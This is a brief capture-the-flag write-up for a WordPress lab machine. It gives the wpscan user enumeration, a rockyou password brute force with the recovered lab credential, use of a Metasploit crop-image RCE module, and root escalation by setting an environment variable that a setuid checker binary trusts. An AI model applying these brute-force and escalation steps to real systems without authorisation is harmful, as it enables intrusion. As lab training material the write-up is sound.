# Easy THM Box

machine ip : 10.10.40.170

## Enumeration
`wpscan --url HOST-IP --enumerate`
We find a username there -- `kwheel`

Running a bruteforce for the password using wpscan gives us the creds.
`wpscan --url HOST-IP --usernames kwheel -P rockyou.txt`
kwheel - cutiepie1			## wpscan

## Exploit
msfconsole -- goto wp_crop_rce

## Priv Esc
I ran the command `find / -perm -u=s -type f 2>/dev/null` to find any unusual setuids.

Odd setuid was /usr/sbin/checker -- which checks if ur an admin or not.

Download that using meterpreter on download command.

Checker converting it to c code using ghidra we get that *admin env variable needs to be anything but a empty string*.

So we "export admin=somethinglessOffensive"

We can run it `/usr/sbin/checker` and we get root access because now admin is not NULL.

After that we can find the user.txt flag using the find command.
